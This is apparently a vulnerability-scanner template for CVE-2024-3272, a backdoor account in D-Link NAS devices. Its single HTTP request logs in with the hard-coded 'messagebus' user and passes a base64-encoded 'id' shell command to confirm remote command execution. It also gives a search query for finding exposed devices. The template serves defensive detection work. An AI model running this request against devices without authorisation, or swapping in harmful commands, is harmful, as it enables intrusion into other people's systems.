id: CVE-2024-3272

info:
  name: D-Link Network Attached Storage - Backdoor Account
  author: ritikchaddha
  severity: critical
  description: |
    A vulnerability, which was classified as very critical, has been found in D-Link DNS-320L, DNS-325, DNS-327L and DNS-340L up to 20240403. This issue affects some unknown processing of the file /cgi-bin/nas_sharing.cgi of the component HTTP GET Request Handler. The manipulation of the argument user with the input messagebus leads to hard-coded credentials.
  reference:
    - https://github.com/netsecfish/dlink
    - https://nvd.nist.gov/vuln/detail/cve-2024-3272
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-3272
    cwe-id: CWE-77
    cpe: cpe:2.3:o:dlink:dns-320l_firmware:-:*:*:*:*:*:*:*
    epss-score: 0.83361
    epss-percentile: 0.98438
  metadata:
    verified: true
    max-request: 1
    vendor: dlink
    product: "dns-320l_firmware"
    fofa-query: app="D_Link-DNS-ShareCenter"
  tags: cve,cve2024,dlink,nas,kev

http:
  - raw:
      - |+
        GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ= HTTP/1.1
        Host: {{Hostname}}

    unsafe: true

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<auth_state>1</auth_state>"

      - type: regex
        part: body
        regex:
          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"

      - type: status
        status:
          - 200
# digest: 4a0a004730450220405e40749d02c55e23be4ebcfea2ab3c745f7560f310a084393c38a7cc83ac00022100f8225bb9c03eec55d376e350e30882600c573b570a732dc06c8d11f78c702b05:922c64590222798bb761d5b6d8e72950